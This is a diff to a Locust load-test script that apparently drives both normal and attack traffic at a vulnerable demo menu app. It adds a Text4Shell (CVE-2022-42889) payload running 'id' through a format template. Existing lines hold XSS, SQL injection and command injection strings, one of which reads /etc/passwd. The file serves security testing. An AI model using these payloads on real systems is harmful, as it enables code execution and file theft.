@@ -35,6 +35,9 @@ XSS_PAYLOAD = '<img src=x onerror=alert("XSS")>'
 SQLI_PAYLOAD = "' OR 1=1--"
 CMD_INJECTION_RECEIPT = "txt;id"
 CMD_INJECTION_EXPORT = "orders.csv; cat /etc/passwd"
+TEXT4SHELL_PAYLOAD = (
+    "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}"
+)
 
 DOS_NESTED_DEPTH = 15000
 
@@ -100,6 +103,17 @@ class CorndogUser(HttpUser):
             f"/api/menu/{item_id}",
             headers=HEADERS,
             name="GET /api/menu/{id} [golden]",
+        )
+        _extra_latency()
+
+    @task(2)
+    def formatted_menu_item(self):
+        """GET /api/menu/{id}/formatted — custom-formatted menu item display."""
+        item_id = random.choice(MENU_ITEM_IDS)
+        self.client.get(
+            f"/api/menu/{item_id}/formatted?template=${{name}}+%E2%80%94+${{description}}",
+            headers=HEADERS,
+            name="GET /api/menu/{id}/formatted [golden]",
         )
         _extra_latency()
 
@@ -221,6 +235,17 @@ class CorndogUser(HttpUser):
             headers=HEADERS,
             name="POST /api/loyalty/validate-config [dos-nested-json]",
             catch_response=True,
+        )
+
+    @task(1)
+    def scenario_text4shell(self):
+        """Text4Shell via menu format template — triggers CVE-2022-42889."""
+        item_id = random.choice(MENU_ITEM_IDS)
+        self.client.get(
+            f"/api/menu/{item_id}/formatted",
+            params={"template": TEXT4SHELL_PAYLOAD},
+            headers=HEADERS,
+            name="GET /api/menu/{id}/formatted [text4shell]",
         )
 
     @task(1)
